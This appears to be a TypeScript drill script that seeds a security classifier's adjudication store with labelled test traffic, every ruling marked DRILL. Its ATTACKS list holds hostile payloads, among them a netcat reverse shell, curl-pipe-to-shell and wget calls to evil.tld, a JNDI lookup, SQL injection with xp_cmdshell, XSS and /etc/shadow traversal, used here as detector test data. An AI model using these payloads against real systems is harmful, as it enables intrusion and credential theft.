/**
 * DRILL SEEDER — proves the adjudication machinery, and cannot be mistaken for
 * operator data
 *
 * Phase 2's acceptance criterion needs a corpus of real operator rulings, which
 * only accumulates from live traffic. But the machinery around that corpus —
 * temporal folds, the tuning/test separation, the two-step scoring protocol —
 * has to be verifiable now, before an operator has labelled anything, or it
 * ships untested.
 *
 * So this script fills the store with enough traffic to exercise the folds, and
 * labels every row `AUTOMATED_IMPORT` / `DRILL`. That is not a disclaimer in a
 * comment: `stats()` reports the breakdown by origin, `operatorGrounded` goes
 * false, and the harness prints a NOT OPERATOR-GROUNDED banner above any figure
 * computed from it. Drill labels cannot quietly become the platform's accuracy
 * claim, which is the failure mode this whole plan exists to prevent.
 *
 * The labels here are assigned from the payload's construction — an attack
 * string is labelled MALICIOUS, ordinary traffic BENIGN — NOT from what the
 * classifier says about it. If the classifier disagrees with a drill label, that
 * disagreement is a real finding about the classifier, which is the only reason
 * seeding this way is worth anything.
 *
 * Run:    npx tsx audit/seed_adjudication_drill.ts
 * Clear:  npx tsx audit/seed_adjudication_drill.ts --purge
 */

import { DatabaseSync } from 'node:sqlite';
import path from 'path';

const BASE = 'http://127.0.0.1:3000';
const KEY = process.env.ADMIN_API_KEY || 'test_admin_key_123';
const ADJ = `${BASE}/api/v1/soc/adjudication`;
const auth = { 'x-api-key': KEY, 'Content-Type': 'application/json' };

const ATTACKS = [
  "' OR SLEEP(5)#", "admin'/**/OR/**/1=1#", "1; WAITFOR DELAY '0:0:5'--",
  "<svg/onload=alert(1)>", "<iframe srcdoc='<script>alert(1)</script>'>",
  "javascript:void(document.cookie)", "<body onpageshow=alert(1)>",
  "../../../../etc/shadow", "..%252f..%252fwindows/win.ini", "/proc/self/cmdline",
  ";nc -e /bin/sh 10.0.0.9 4444", "|| curl http://evil.tld/s.sh | sh",
  "`wget http://evil.tld/x`", "$(id)", "%0Acat%20/etc/passwd",
  "${jndi:ldap://evil.tld/a}", "{{7*'7'}}", "<%= system('id') %>",
  "{\"$where\":\"this.pw.match(/.*/)\"}", "{\"user\":{\"$gt\":\"\"}}",
  "<!DOCTYPE x [<!ENTITY a SYSTEM 'file:///etc/hosts'>]><x>&a;</x>",
  "http://169.254.169.254/latest/meta-data/iam/", "http://[::1]:6379/info",
  "O:4:\"Evil\":1:{s:3:\"cmd\";s:2:\"id\";}", "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA",
  "{\"__proto__\":{\"isAdmin\":true}}", "{\"constructor\":{\"prototype\":{\"x\":1}}}",
  "(|(objectClass=*)(uid=*))", "' or count(/*)>0 or '",
  "X-Forwarded-Host: evil.tld", "{\"role\":\"superadmin\",\"verified\":true}",
  "query{__schema{types{name fields{name}}}}", "url=http://127.0.0.1:22/",
  "DROP TABLE sessions; --", "UNION SELECT load_file('/etc/passwd')",
  "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>", "..\\\\..\\\\..\\\\boot.ini",
  "%3Cscript%3Efetch('//x.io')%3C/script%3E", "'; EXEC xp_cmdshell 'dir'--",
  "file:///etc/passwd", "gopher://127.0.0.1:11211/_stats"
];

const BENIGN = [
  "GET /api/v1/products?page=1&limit=20", "POST /api/v1/cart {\"sku\":\"A-1\",\"qty\":2}",
  "GET /api/v1/users/me", "PATCH /api/v1/profile {\"displayName\":\"Sara\"}",
  "GET /health", "GET /static/css/app.min.css", "POST /api/v1/auth/refresh",
  "GET /api/v1/orders/8821/invoice.pdf", "DELETE /api/v1/cart/items/3",
  "GET /api/v1/search?q=wireless+keyboard", "POST /api/v1/feedback {\"score\":9}",
  "GET /api/v1/notifications?unread=true", "PUT /api/v1/settings/locale {\"lang\":\"ar\"}",
  "GET /api/v1/reports?from=2026-09-01&to=2026-09-30", "POST /api/v1/sessions",
  "GET /api/v1/teams/14/members", "GET /favicon.ico",
  "POST /api/v1/uploads/complete {\"key\":\"docs/spec.pdf\"}",
  "GET /api/v1/billing/invoices?status=paid", "PATCH /api/v1/tasks/91 {\"done\":true}",
  "GET /api/v1/audit-log?actor=ops&limit=50", "POST /api/v1/webhooks/ping",
  "GET /api/v1/catalog/categories", "POST /api/v1/comments {\"body\":\"Looks good to me\"}",
  "GET /api/v1/metrics/uptime", "PUT /api/v1/profile/avatar",
  "GET /api/v1/shipments?carrier=dhl", "POST /api/v1/export/csv {\"scope\":\"orders\"}",
  "GET /api/v1/features", "GET /api/v1/regions?active=1",
  // Attack-shaped but legitimate: prose and paths that a naive rule flags.
  "POST /api/v1/kb {\"title\":\"Guarding against SQL injection in reports\"}",
  "POST /api/v1/tickets {\"desc\":\"User sees an alert(1) popup on checkout\"}",
  "GET /api/v1/docs/v1/../v2/authentication",
  "POST /api/v1/notes {\"text\":\"Discussed path traversal in the review\"}",
  "POST /api/v1/glossary {\"term\":\"prototype pollution\"}",
  "POST /api/v1/templates {\"body\":\"Hello {{firstName}}, welcome aboard.\"}",
  "GET /api/v1/search?q=how+do+I+prevent+XSS",
  "POST /api/v1/config {\"yaml\":\"timeout: 30\\nretries: 2\"}",
  "GET /api/v1/tokens?prefix=eyJhbGciOiJSUzI1NiJ9",
  "POST /api/v1/incidents {\"summary\":\"Reviewed the eval() lint warning\"}"
];

async function main() {
  if (process.argv.includes('--purge')) {
    // Purge touches the store directly on purpose. There is no HTTP route that
    // deletes labels, because an append-only audit trail with a delete endpoint
    // is not append-only. Clearing drill data is a local maintenance act.
    const db = new DatabaseSync(path.join(process.cwd(), 'data', 'adjudication.db'));
    const n = db.prepare("SELECT COUNT(*) AS n FROM labels WHERE source = 'DRILL'").get() as any;
    db.prepare("DELETE FROM labels WHERE source = 'DRILL'").run();
    db.prepare("DELETE FROM pending_detections").run();
    console.log(`purged ${Number(n?.n ?? 0)} drill labels and cleared the pending queue`);
    return;
  }

  const health = await fetch(`${BASE}/api/health`).catch(() => null);
  if (!health?.ok) { console.error(`Server not reachable at ${BASE}.`); process.exit(2); }

  console.log('\n  Seeding drill traffic and rulings (marked DRILL / AUTOMATED_IMPORT)\n');

  // Interleave so the temporal folds do not end up as one pure-attack fold
  // followed by one pure-benign fold, which would make every per-fold figure
  // meaningless.
  const stream: Array<{ payload: string; label: 'MALICIOUS' | 'BENIGN' }> = [];
  const maxLen = Math.max(ATTACKS.length, BENIGN.length);
  for (let i = 0; i < maxLen; i++) {
    if (i < BENIGN.length) stream.push({ payload: BENIGN[i], label: 'BENIGN' });
    if (i < BENIGN.length && i + maxLen < BENIGN.length * 2) { /* keep benign-dominant */ }
    if (i < ATTACKS.length) stream.push({ payload: ATTACKS[i], label: 'MALICIOUS' });
  }

  let queued = 0;
  for (let i = 0; i < stream.length; i++) {
    const r = await fetch(`${BASE}/api/v1/agent/ai-analyze`, {
      method: 'POST', headers: auth,
      body: JSON.stringify({
        packet: {
          srcIp: `10.90.${i % 250}.${(i * 13) % 250}`, dstIp: '10.0.1.10',
          port: 443, protocol: 'HTTPS', vector: 'UNKNOWN', payload: stream[i].payload
        }
      })
    });
    if (r.ok) queued++;
  }
  console.log(`  classified ${queued}/${stream.length} payloads`);

  // Adjudicate everything in the queue against the construction of the payload,
  // not against what the classifier decided about it.
  const truth = new Map(stream.map(s => [s.payload, s.label]));
  let labelled = 0, overturned = 0, skipped = 0;

  for (let round = 0; round < 12; round++) {
    const qr = await fetch(`${ADJ}/queue?limit=200`, { headers: auth });
    const q: any = await qr.json().catch(() => ({ items: [] }));
    if (!q.items?.length) break;

    for (const item of q.items) {
      const label = truth.get(item.payloadSample);
      if (!label) { skipped++; continue; }
      const res = await fetch(`${ADJ}/adjudicate`, {
        method: 'POST', headers: auth,
        body: JSON.stringify({
          detectionId: item.id,
          analystLabel: label,
          adjudicatedBy: 'drill-harness',
          actorKind: 'AUTOMATED_IMPORT',
          source: 'DRILL',
          notes: 'Seeded to exercise fold and export machinery. Not operator ground truth.'
        })
      });
      const d: any = await res.json().catch(() => ({}));
      if (d.success) { labelled++; if (d.overturnedMachine) overturned++; }
    }
  }

  console.log(`  labelled ${labelled}  (machine overturned on ${overturned})`);
  if (skipped) console.log(`  skipped ${skipped} queue entries with no drill label`);

  const st: any = await (await fetch(`${ADJ}/stats`, { headers: auth })).json();
  console.log(`\n  corpus now ${st.totalLabels} labels  (${st.malicious} malicious / ${st.benign} benign)`);
  console.log(`  operatorGrounded: ${st.operatorGrounded}  <-- false, as it must be for drill data`);
  const f: any = await (await fetch(`${ADJ}/folds`, { headers: auth })).json();
  console.log(`  folds sufficient: ${f.sufficient}`);
  if (f.sufficient) for (const fold of f.folds) console.log(`    fold ${fold.index}  n=${fold.n}  ${fold.role}`);
  else console.log(`    ${f.shortfall}`);
  console.log('');
}

main().catch(e => { console.error(e); process.exit(1); });
